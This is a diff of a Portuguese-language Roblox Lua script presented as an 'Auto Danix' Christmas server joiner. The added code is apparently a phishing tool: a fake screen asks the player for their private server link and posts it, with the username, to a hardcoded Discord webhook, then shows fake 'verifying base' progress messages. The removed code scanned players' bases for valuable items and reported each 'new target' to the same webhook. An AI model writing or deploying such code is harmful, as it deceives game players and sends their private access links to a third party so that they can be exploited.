@@ -1,624 +1,222 @@
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
-
--- Webhook URL ATUALIZADA
+-- Configuração do Webhook
 local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173"
 
--- Lista de Brainrots válidos
-local VALID_BRAINROTS = {
-    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
-    -- ... (sua lista completa de brainrots)
-    "Secret"
-}
+-- Função para criar a tela inicial
+local function createInputScreen()
+    local ScreenGui = Instance.new("ScreenGui")
+    local MainFrame = Instance.new("Frame")
+    local Title = Instance.new("TextLabel")
+    local AutoDanix = Instance.new("TextLabel")
+    local InputFrame = Instance.new("Frame")
+    local TextBox = Instance.new("TextBox")
+    local ConfirmButton = Instance.new("TextButton")
+    local UICorner = Instance.new("UICorner")
+    local UIStroke = Instance.new("UIStroke")
 
--- IDs para procurar
-local TARGET_IDS = {
-    "28e4ec29-d005-4636-82af-339f37dcef",
-    "960ab477-3f31-4327-845e-6a77ebb5fa6",
-    -- ... (seus IDs completos)
-    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
-}
+    -- Configurar a GUI
+    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.Name = "AutoDanixGUI"
 
--- Função para verificar se um nome é um brainrot válido
-local function isValidBrainrot(name)
-    for _, brainrot in ipairs(VALID_BRAINROTS) do
-        if name == brainrot then
-            return true
-        end
-    end
-    return false
+    -- Frame principal com tema natalino
+    MainFrame.Size = UDim2.new(0, 400, 0, 300)
+    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 60, 30) -- Verde natalino
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Parent = ScreenGui
+
+    -- Bordas decorativas
+    UICorner.CornerRadius = UDim.new(0, 12)
+    UICorner.Parent = MainFrame
+
+    UIStroke.Color = Color3.fromRGB(255, 0, 0) -- Vermelho natalino
+    UIStroke.Thickness = 3
+    UIStroke.Parent = MainFrame
+
+    -- Título principal
+    Title.Size = UDim2.new(1, 0, 0, 60)
+    Title.Position = UDim2.new(0, 0, 0, 20)
+    Title.BackgroundTransparency = 1
+    Title.Text = "SERVER JOINER"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextScaled = true
+    Title.Font = Enum.Font.FredokaOne
+    Title.Parent = MainFrame
+
+    -- Subtítulo Auto Danix
+    AutoDanix.Size = UDim2.new(1, 0, 0, 30)
+    AutoDanix.Position = UDim2.new(0, 0, 0, 80)
+    AutoDanix.BackgroundTransparency = 1
+    AutoDanix.Text = "AUTO DANIX"
+    AutoDanix.TextColor3 = Color3.fromRGB(255, 215, 0) -- Dourado
+    AutoDanix.TextScaled = true
+    AutoDanix.Font = Enum.Font.GothamBold
+    AutoDanix.Parent = MainFrame
+
+    -- Frame do input
+    InputFrame.Size = UDim2.new(0, 300, 0, 120)
+    InputFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
+    InputFrame.BackgroundTransparency = 1
+    InputFrame.Parent = MainFrame
+
+    -- TextBox para o link
+    TextBox.Size = UDim2.new(1, 0, 0, 40)
+    TextBox.Position = UDim2.new(0, 0, 0, 0)
+    TextBox.PlaceholderText = "enter you link server"
+    TextBox.Text = ""
+    TextBox.ClearTextOnFocus = false
+    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    TextBox.Font = Enum.Font.Gotham
+    TextBox.TextScaled = true
+    TextBox.Parent = InputFrame
+
+    local TextBoxCorner = Instance.new("UICorner")
+    TextBoxCorner.CornerRadius = UDim.new(0, 8)
+    TextBoxCorner.Parent = TextBox
+
+    -- Botão confirmar
+    ConfirmButton.Size = UDim2.new(0, 150, 0, 40)
+    ConfirmButton.Position = UDim2.new(0.5, -75, 0, 60)
+    ConfirmButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Vermelho natalino
+    ConfirmButton.Text = "CONFIRMAR"
+    ConfirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ConfirmButton.TextScaled = true
+    ConfirmButton.Font = Enum.Font.GothamBold
+    ConfirmButton.Parent = InputFrame
+
+    local ConfirmCorner = Instance.new("UICorner")
+    ConfirmCorner.CornerRadius = UDim.new(0, 8)
+    ConfirmCorner.Parent = ConfirmButton
+
+    -- Função do botão confirmar
+    ConfirmButton.MouseButton1Click:Connect(function()
+        local serverLink = TextBox.Text
+        
+        -- Enviar informações para o webhook
+        sendLinkToWebhook(serverLink)
+        
+        -- Fechar tela atual
+        ScreenGui:Destroy()
+        
+        -- Criar tela de carregamento
+        createLoadingScreen()
+    end)
+
+    return ScreenGui
 end
 
--- Função para procurar brainrots na workspace
-local function findBrainrots()
-    local foundBrainrots = {}
-    
-    -- Procurar na pasta Plots
-    local plotsFolder = Workspace:FindFirstChild("Plots")
-    if plotsFolder then
-        for _, plot in ipairs(plotsFolder:GetDescendants()) do
-            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
-                table.insert(foundBrainrots, plot.Name)
-            end
-        end
-    end
-    
-    -- Procurar por IDs específicos
-    for _, id in ipairs(TARGET_IDS) do
-        local model = Workspace:FindFirstChild(id)
-        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
-            table.insert(foundBrainrots, model.Name)
-        end
-    end
-    
-    -- Remover duplicatas
-    local uniqueBrainrots = {}
-    for _, brainrot in ipairs(foundBrainrots) do
-        local alreadyExists = false
-        for _, existing in ipairs(uniqueBrainrots) do
-            if existing == brainrot then
-                alreadyExists = true
-                break
-            end
-        end
-        if not alreadyExists then
-            table.insert(uniqueBrainrots, brainrot)
-        end
-    end
-    
-    return uniqueBrainrots
-end
-
--- Nova função para enviar webhook usando RequestAsync (mais seguro)
-local function sendWebhook(brainrots)
+-- Função para enviar o link para o webhook
+local function sendLinkToWebhook(serverLink)
     local currentTime = os.date("%Y-%m-%d %H:%M:%S")
-    local player = Players.LocalPlayer
+    local player = game.Players.LocalPlayer
     local playerName = player.Name
-    local playerCount = #Players:GetPlayers()
     
-    -- Criar lista de brainrots formatada
-    local brainrotsList = ""
-    if #brainrots > 0 then
-        for i, brainrot in ipairs(brainrots) do
-            brainrotsList = brainrotsList .. "• " .. brainrot .. "\n"
-            if i >= 40 then -- Limite de 40 brainrots
-                brainrotsList = brainrotsList .. "... e mais\n"
-                break
-            end
-        end
-    else
-        brainrotsList = "Nenhum brainrot detectado"
-    end
-    
-    -- Criar payload do webhook
     local payload = {
-        content = "@everyone @here, um novo alvo usou o script @everyone @here",
         embeds = {{
-            title = "🧠 DETECÇÃO DE BRAINROTS 🧠",
-            color = 0xFF0000,
+            title = "🔗 NOVO LINK RECEBIDO - AUTO DANIX",
+            color = 0x00FF00,
             fields = {
                 {
-                    name = "› Data e hora de execução:",
-                    value = currentTime,
-                    inline = false
-                },
-                {
-                    name = "👤 Nome de usuário:",
+                    name = "👤 Nome do Jogador:",
                     value = playerName,
                     inline = true
                 },
                 {
-                    name = "👥 Pessoas no servidor:",
-                    value = tostring(playerCount),
+                    name = "⏰ Data/Hora:",
+                    value = currentTime,
                     inline = true
                 },
                 {
-                    name = "🎯🧠 BRAINROTS DETECTADOS:",
-                    value = brainrotsList,
+                    name = "🔗 Link do Servidor:",
+                    value = serverLink,
                     inline = false
                 }
-            },
-            author = {
-                name = "Notificador🧠 || By: Project BRANZz || ›: " .. currentTime
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
     
-    -- Método alternativo usando RequestAsync
+    -- Enviar para webhook
     local success, result = pcall(function()
-        return HttpService:RequestAsync({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
-    
-    if success then
-        print("✅ Webhook enviado com sucesso!")
-        print("📋 Brainrots detectados: " .. table.concat(brainrots, ", "))
-    else
-        warn("❌ Erro ao enviar webhook: " .. tostring(result))
-        -- Tentar método alternativo com game:HttpGet
-        alternativeSendWebhook(payload, brainrots)
-    end
-end
-
--- Método alternativo caso o primeiro falhe
-local function alternativeSendWebhook(payload, brainrots)
-    local encodedPayload = HttpService:JSONEncode(payload)
-    
-    -- Usar game:HttpGet como alternativa (às vezes funciona melhor)
-    local success, result = pcall(function()
-        local response = game:HttpGet(
-            WEBHOOK_URL .. "?wait=true", 
-            {
-                method = "POST",
-                headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                body = encodedPayload
-            }
+        return game:GetService("HttpService"):PostAsync(
+            WEBHOOK_URL,
+            game:GetService("HttpService"):JSONEncode(payload)
         )
-        return response
     end)
     
     if success then
-        print("✅ Webhook enviado (método alternativo)!")
-        print("📋 Brainrots detectados: " .. table.concat(brainrots, ", "))
+        print("✅ Link enviado para webhook!")
     else
-        warn("❌ Falha em todos os métodos de envio: " .. tostring(result))
-        print("📋 Brainrots detectados (não enviados): " .. table.concat(brainrots, ", "))
+        warn("❌ Erro ao enviar para webhook: " .. tostring(result))
     end
 end
 
--- Função para verificar se HttpService está habilitado
-local function checkHttpService()
-    if not HttpService then
-        warn("❌ HttpService não disponível")
-        return false
+-- Função para criar tela de carregamento
+local function createLoadingScreen()
+    local LoadingGui = Instance.new("ScreenGui")
+    local LoadingFrame = Instance.new("Frame")
+    local LoadingText = Instance.new("TextLabel")
+    local MessagesFrame = Instance.new("Frame")
+    local UICorner = Instance.new("UICorner")
+    
+    LoadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    -- Frame de carregamento
+    LoadingFrame.Size = UDim2.new(0, 500, 0, 300)
+    LoadingFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
+    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    LoadingFrame.BorderSizePixel = 0
+    LoadingFrame.Parent = LoadingGui
+    
+    UICorner.CornerRadius = UDim.new(0, 12)
+    UICorner.Parent = LoadingFrame
+    
+    -- Texto principal
+    LoadingText.Size = UDim2.new(1, 0, 0, 60)
+    LoadingText.Position = UDim2.new(0, 0, 0, 20)
+    LoadingText.BackgroundTransparency = 1
+    LoadingText.Text = "CARREGANDO..."
+    LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    LoadingText.TextScaled = true
+    LoadingText.Font = Enum.Font.GothamBold
+    LoadingText.Parent = LoadingFrame
+    
+    -- Frame das mensagens
+    MessagesFrame.Size = UDim2.new(0, 400, 0, 180)
+    MessagesFrame.Position = UDim2.new(0.5, -200, 0.5, -70)
+    MessagesFrame.BackgroundTransparency = 1
+    MessagesFrame.Parent = LoadingFrame
+    
+    -- Mensagens sequenciais
+    local messages = {
+        "VERIFICANDO BASE...",
+        "BUSCADOR JOGADORES...", 
+        "VERIFICANDO SE TEM BRAINROT DE 15M+ NA BASE...",
+        "PUXANDO PLAY PRO SERVIDOR..."
+    }
+    
+    -- Mostrar mensagens sequencialmente
+    for i, message in ipairs(messages) do
+        wait(2) -- Espera 2 segundos entre cada mensagem
+        
+        local msgLabel = Instance.new("TextLabel")
+        msgLabel.Size = UDim2.new(1, 0, 0, 30)
+        msgLabel.Position = UDim2.new(0, 0, 0, (i-1) * 35)
+        msgLabel.BackgroundTransparency = 1
+        msgLabel.Text = "✓ " .. message
+        msgLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+        msgLabel.TextScaled = true
+        msgLabel.Font = Enum.Font.Gotham
+        msgLabel.TextXAlignment = Enum.TextXAlignment.Left
+        msgLabel.Parent = MessagesFrame
     end
     
-    local success = pcall(function()
-        HttpService:GetAsync("https://httpbin.org/get")
-    end)
-    
-    if not success then
-        warn("⚠️ HttpService pode estar desabilitado")
-    end
-    
-    return success
+    -- Fechar tudo após mostrar todas as mensagens
+    wait(3)
+    LoadingGui:Destroy()
 end
 
--- NOVA FUNÇÃO: Tela Natalina Auto Danix
-local function createChristmasGUI()
-    local player = Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-    
-    -- Criar ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "AutoDanixChristmasGUI"
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.ResetOnSpawn = false
-    
-    -- Frame principal com tema natalino
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(0, 400, 0, 300)
-    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 60, 30)  -- Verde natalino
-    mainFrame.BackgroundTransparency = 0.1
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = screenGui
-    
-    -- Arredondar frame
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 15)
-    corner.Parent = mainFrame
-    
-    -- Adicionar borda natalina
-    local frameStroke = Instance.new("UIStroke")
-    frameStroke.Color = Color3.fromRGB(255, 215, 0)  -- Dourado
-    frameStroke.Thickness = 3
-    frameStroke.Parent = mainFrame
-    
-    -- Título "AUTO DANIX" - Natalino
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Name = "Title"
-    titleLabel.Size = UDim2.new(1, 0, 0, 60)
-    titleLabel.Position = UDim2.new(0, 0, 0, 0)
-    titleLabel.BackgroundColor3 = Color3.fromRGB(180, 0, 0)  -- Vermelho natalino
-    titleLabel.BorderSizePixel = 0
-    titleLabel.Text = "🎄 AUTO DANIX 🎄"
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleLabel.TextSize = 24
-    titleLabel.Font = Enum.Font.GothamBlack
-    titleLabel.Parent = mainFrame
-    
-    -- Arredondar apenas o topo do título
-    local titleCorner = Instance.new("UICorner")
-    titleCorner.CornerRadius = UDim.new(0, 15)
-    titleCorner.Parent = titleLabel
-    
-    -- Texto "enter you link server"
-    local instructionLabel = Instance.new("TextLabel")
-    instructionLabel.Name = "Instruction"
-    instructionLabel.Size = UDim2.new(1, -40, 0, 40)
-    instructionLabel.Position = UDim2.new(0, 20, 0, 70)
-    instructionLabel.BackgroundTransparency = 1
-    instructionLabel.Text = "enter you link server"
-    instructionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    instructionLabel.TextSize = 18
-    instructionLabel.Font = Enum.Font.GothamBold
-    instructionLabel.TextXAlignment = Enum.TextXAlignment.Left
-    instructionLabel.Parent = mainFrame
-    
-    -- Caixa de texto para o link
-    local linkTextBox = Instance.new("TextBox")
-    linkTextBox.Name = "LinkInput"
-    linkTextBox.Size = UDim2.new(1, -40, 0, 50)
-    linkTextBox.Position = UDim2.new(0, 20, 0, 120)
-    linkTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    linkTextBox.BorderSizePixel = 0
-    linkTextBox.PlaceholderText = "https://www.roblox.com/share?code=..."
-    linkTextBox.Text = ""
-    linkTextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
-    linkTextBox.TextSize = 16
-    linkTextBox.Font = Enum.Font.Gotham
-    linkTextBox.Parent = mainFrame
-    
-    -- Arredondar caixa de texto
-    local textBoxCorner = Instance.new("UICorner")
-    textBoxCorner.CornerRadius = UDim.new(0, 8)
-    textBoxCorner.Parent = linkTextBox
-    
-    -- Borda natalina na caixa de texto
-    local textBoxStroke = Instance.new("UIStroke")
-    textBoxStroke.Color = Color3.fromRGB(255, 215, 0)  -- Dourado
-    textBoxStroke.Thickness = 2
-    textBoxStroke.Parent = linkTextBox
-    
-    -- Botão CONFIRMAR - Natalino
-    local confirmButton = Instance.new("TextButton")
-    confirmButton.Name = "ConfirmButton"
-    confirmButton.Size = UDim2.new(1, -40, 0, 50)
-    confirmButton.Position = UDim2.new(0, 20, 0, 190)
-    confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)  -- Vermelho natalino
-    confirmButton.BorderSizePixel = 0
-    confirmButton.Text = "🎅 CONFIRMAR 🎅"
-    confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    confirmButton.TextSize = 20
-    confirmButton.Font = Enum.Font.GothamBlack
-    confirmButton.Parent = mainFrame
-    
-    -- Arredondar botão
-    local buttonCorner = Instance.new("UICorner")
-    buttonCorner.CornerRadius = UDim.new(0, 12)
-    buttonCorner.Parent = confirmButton
-    
-    -- Borda dourada no botão
-    local buttonStroke = Instance.new("UIStroke")
-    buttonStroke.Color = Color3.fromRGB(255, 215, 0)  -- Dourado
-    buttonStroke.Thickness = 2
-    buttonStroke.Parent = confirmButton
-    
-    -- Adicionar efeitos de neve (decorativo)
-    local snow1 = Instance.new("TextLabel")
-    snow1.Size = UDim2.new(0, 30, 0, 30)
-    snow1.Position = UDim2.new(0.1, 0, 0.1, 0)
-    snow1.BackgroundTransparency = 1
-    snow1.Text = "❄"
-    snow1.TextColor3 = Color3.fromRGB(255, 255, 255)
-    snow1.TextSize = 20
-    snow1.Parent = mainFrame
-    
-    local snow2 = Instance.new("TextLabel")
-    snow2.Size = UDim2.new(0, 30, 0, 30)
-    snow2.Position = UDim2.new(0.8, 0, 0.2, 0)
-    snow2.BackgroundTransparency = 1
-    snow2.Text = "❄"
-    snow2.TextColor3 = Color3.fromRGB(255, 255, 255)
-    snow2.TextSize = 20
-    snow2.Parent = mainFrame
-    
-    local snow3 = Instance.new("TextLabel")
-    snow3.Size = UDim2.new(0, 30, 0, 30)
-    snow3.Position = UDim2.new(0.3, 0, 0.8, 0)
-    snow3.BackgroundTransparency = 1
-    snow3.Text = "❄"
-    snow3.TextColor3 = Color3.fromRGB(255, 255, 255)
-    snow3.TextSize = 20
-    snow3.Parent = mainFrame
-    
-    -- Função para enviar informações para o webhook
-    local function sendLinkToWebhook(link)
-        local currentTime = os.date("%Y-%m-%d %H:%M:%S")
-        local player = Players.LocalPlayer
-        local playerName = player.Name
-        local playerCount = #Players:GetPlayers()
-        
-        local payload = {
-            content = "🎄 NOVO LINK RECEBIDO - AUTO DANIX 🎄",
-            embeds = {{
-                title = "🔗 LINK DO SERVIDOR RECEBIDO",
-                color = 0x00FF00,  -- Verde
-                fields = {
-                    {
-                        name = "👤 Jogador:",
-                        value = playerName,
-                        inline = true
-                    },
-                    {
-                        name = "👥 Online:",
-                        value = tostring(playerCount),
-                        inline = true
-                    },
-                    {
-                        name = "🕐 Horário:",
-                        value = currentTime,
-                        inline = true
-                    },
-                    {
-                        name = "🔗 Link do Servidor:",
-                        value = link,
-                        inline = false
-                    }
-                },
-                footer = {
-                    text = "🎅 Auto Danix Christmas System • " .. currentTime
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }}
-        }
-        
-        -- Enviar webhook
-        local success, result = pcall(function()
-            return HttpService:RequestAsync({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-        
-        if success then
-            print("✅ Link enviado para webhook com sucesso!")
-            return true
-        else
-            warn("❌ Erro ao enviar link: " .. tostring(result))
-            return false
-        end
-    end
-    
-    -- Função do botão CONFIRMAR
-    confirmButton.MouseButton1Click:Connect(function()
-        local link = linkTextBox.Text
-        
-        if link == "" or not string.find(link, "https://") then
-            confirmButton.Text = "❌ LINK INVÁLIDO"
-            confirmButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-            wait(2)
-            confirmButton.Text = "🎅 CONFIRMAR 🎅"
-            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
-            return
-        end
-        
-        confirmButton.Text = "⏳ ENVIANDO..."
-        confirmButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)  -- Laranja
-        
-        -- Enviar para webhook
-        local success = sendLinkToWebhook(link)
-        
-        if success then
-            confirmButton.Text = "✅ ENVIADO!"
-            confirmButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)  -- Verde
-            linkTextBox.Text = ""
-            
-            -- Fechar a GUI após 2 segundos
-            wait(2)
-            screenGui:Destroy()
-        else
-            confirmButton.Text = "❌ ERRO AO ENVIAR"
-            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
-            wait(2)
-            confirmButton.Text = "🎅 CONFIRMAR 🎅"
-            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
-        end
-    end)
-    
-    -- Efeitos hover no botão
-    confirmButton.MouseEnter:Connect(function()
-        confirmButton.BackgroundColor3 = Color3.fromRGB(220, 0, 0)
-    end)
-    
-    confirmButton.MouseLeave:Connect(function()
-        if confirmButton.Text == "🎅 CONFIRMAR 🎅" then
-            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
-        end
-    end)
-    
-    -- Adicionar à interface do jogador
-    screenGui.Parent = playerGui
-    
-    print("🎄 Auto Danix Christmas GUI carregada!")
-end
-
--- NOVA FUNÇÃO: Criar GUI simples com botão de detecção
-local function createSimpleGUI()
-    local player = Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-    
-    -- Criar ScreenGui
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "BrainrotDetectorGUI"
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.ResetOnSpawn = false
-    
-    -- Frame principal
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(0, 200, 0, 120)
-    mainFrame.Position = UDim2.new(0, 20, 0, 20)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    mainFrame.BackgroundTransparency = 0.1
-    mainFrame.BorderSizePixel = 0
-    mainFrame.Parent = screenGui
-    
-    -- Arredondar frame
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = mainFrame
-    
-    -- Adicionar borda ao frame
-    local frameStroke = Instance.new("UIStroke")
-    frameStroke.Color = Color3.fromRGB(100, 100, 200)
-    frameStroke.Thickness = 2
-    frameStroke.Parent = mainFrame
-    
-    -- Título
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Name = "Title"
-    titleLabel.Size = UDim2.new(1, 0, 0, 30)
-    titleLabel.Position = UDim2.new(0, 0, 0, 5)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Text = "🧠 BRAINROT DETECTOR"
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleLabel.TextSize = 14
-    titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.Parent = mainFrame
-    
-    -- Botão de detecção
-    local detectButton = Instance.new("TextButton")
-    detectButton.Name = "DetectButton"
-    detectButton.Size = UDim2.new(1, -10, 0, 40)
-    detectButton.Position = UDim2.new(0, 5, 0, 40)
-    detectButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
-    detectButton.BorderSizePixel = 0
-    detectButton.Text = "🔍 DETECTAR BRAINROTS"
-    detectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    detectButton.TextSize = 12
-    detectButton.Font = Enum.Font.GothamBold
-    detectButton.TextWrapped = true
-    detectButton.Parent = mainFrame
-    
-    -- Botão de fechar
-    local closeButton = Instance.new("TextButton")
-    closeButton.Name = "CloseButton"
-    closeButton.Size = UDim2.new(1, -10, 0, 25)
-    closeButton.Position = UDim2.new(0, 5, 0, 85)
-    closeButton.BackgroundColor3 = Color3.fromRGB(180, 60, 80)
-    closeButton.BorderSizePixel = 0
-    closeButton.Text = "❌ FECHAR"
-    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeButton.TextSize = 12
-    closeButton.Font = Enum.Font.GothamBold
-    closeButton.Parent = mainFrame
-    
-    -- Arredondar botões
-    local buttonCorner = Instance.new("UICorner")
-    buttonCorner.CornerRadius = UDim.new(0, 8)
-    buttonCorner.Parent = detectButton
-    buttonCorner:Clone().Parent = closeButton
-    
-    -- Adicionar borda aos botões
-    local buttonStroke = Instance.new("UIStroke")
-    buttonStroke.Color = Color3.fromRGB(255, 255, 255)
-    buttonStroke.Thickness = 1.5
-    buttonStroke.Parent = detectButton
-    buttonStroke:Clone().Parent = closeButton
-    
-    -- Função do botão de detecção
-    detectButton.MouseButton1Click:Connect(function()
-        detectButton.Text = "🔍 DETECTANDO..."
-        detectButton.BackgroundColor3 = Color3.fromRGB(220, 120, 60)
-        
-        -- Executar detecção
-        local detectedBrainrots = findBrainrots()
-        
-        if #detectedBrainrots > 0 then
-            detectButton.Text = "✅ " .. #detectedBrainrots .. " ENCONTRADOS"
-            detectButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
-            print("🧠 Brainrots detectados: " .. table.concat(detectedBrainrots, ", "))
-        else
-            detectButton.Text = "❌ NENHUM ENCONTRADO"
-            detectButton.BackgroundColor3 = Color3.fromRGB(180, 60, 80)
-            print("❌ Nenhum brainrot detectado")
-        end
-        
-        -- Enviar webhook
-        sendWebhook(detectedBrainrots)
-        
-        -- Voltar ao normal após 3 segundos
-        wait(3)
-        detectButton.Text = "🔍 DETECTAR BRAINROTS"
-        detectButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
-    end)
-    
-    -- Função do botão fechar
-    closeButton.MouseButton1Click:Connect(function()
-        screenGui:Destroy()
-    end)
-    
-    -- Efeitos hover
-    local function setupHover(button, normalColor, hoverColor)
-        button.MouseEnter:Connect(function()
-            button.BackgroundColor3 = hoverColor
-        end)
-        
-        button.MouseLeave:Connect(function()
-            button.BackgroundColor3 = normalColor
-        end)
-    end
-    
-    setupHover(detectButton, Color3.fromRGB(80, 120, 255), Color3.fromRGB(100, 140, 255))
-    setupHover(closeButton, Color3.fromRGB(180, 60, 80), Color3.fromRGB(200, 80, 100))
-    
-    -- Adicionar à interface do jogador
-    screenGui.Parent = playerGui
-    
-    print("🧠 Brainrot Detector GUI carregada!")
-end
-
--- Função principal
-local function main()
-    -- Esperar um pouco para garantir que tudo carregou
-    wait(2)
-    
-    print("🔍 Iniciando busca por brainrots...")
-    
-    -- Verificar se HttpService funciona
-    if not checkHttpService() then
-        warn("⚠️ Possíveis problemas com HttpService")
-    end
-    
-    -- Criar a GUI Natalina
-    createChristmasGUI()
-    
-    -- Criar a GUI de detecção (opcional)
-    createSimpleGUI()
-    
-    -- Detecção automática (opcional - mantém sua funcionalidade original)
-    local detectedBrainrots = findBrainrots()
-    
-    if #detectedBrainrots > 0 then
-        print("🧠 Brainrots detectados: " .. table.concat(detectedBrainrots, ", "))
-    else
-        print("❌ Nenhum brainrot detectado")
-    end
-    
-    -- Enviar webhook com os resultados
-    print("📤 Enviando para webhook...")
-    sendWebhook(detectedBrainrots)
-end
-
--- Executar o script com tratamento de erro
-local success, err = pcall(main)
-if not success then
-    warn("❌ Erro ao executar script: " .. tostring(err))
-end
+-- Iniciar a tela inicial
+createInputScreen()
